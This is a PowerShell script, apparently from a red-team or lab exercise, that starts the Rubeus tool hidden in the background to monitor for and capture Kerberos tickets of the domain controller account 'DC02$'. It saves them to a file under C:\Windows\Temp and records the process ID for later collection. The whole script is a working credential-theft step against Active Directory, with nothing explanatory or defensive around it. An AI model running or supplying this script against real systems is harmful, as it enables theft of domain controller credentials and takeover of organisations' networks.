[CmdletBinding()]
param(
    [string]$TargetDC = "DC02$"
)
$ErrorActionPreference = 'Continue'

$tools = 'C:\Windows\Temp\cadre-tools'
$rubeus = Join-Path $tools 'Rubeus.exe'
$outDir = 'C:\Windows\Temp\cadre-tools\T102-capture'
New-Item -ItemType Directory -Path $outDir -Force | Out-Null
$tgsFile = Join-Path $outDir 'dc02_tgs.txt'
$errFile = "$tgsFile.err"

# Kill any existing monitor
Get-Process -Name Rubeus -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item $tgsFile, $errFile -ErrorAction SilentlyContinue

# Start Rubeus monitor in background (detached), redirect output
$monitorArgs = "monitor /targetuser:$TargetDC /interval:5 /nowrap"
$monProc = Start-Process -FilePath $rubeus -ArgumentList $monitorArgs -RedirectStandardOutput $tgsFile -RedirectStandardError $errFile -PassThru -WindowStyle Hidden
Write-Output "MONITOR_PID $($monProc.Id)"
# Persist PID for later collection
Set-Content -Path (Join-Path $outDir 'monitor.pid') -Value $monProc.Id
Start-Sleep -Seconds 3
Write-Output "MONITOR_STARTED"
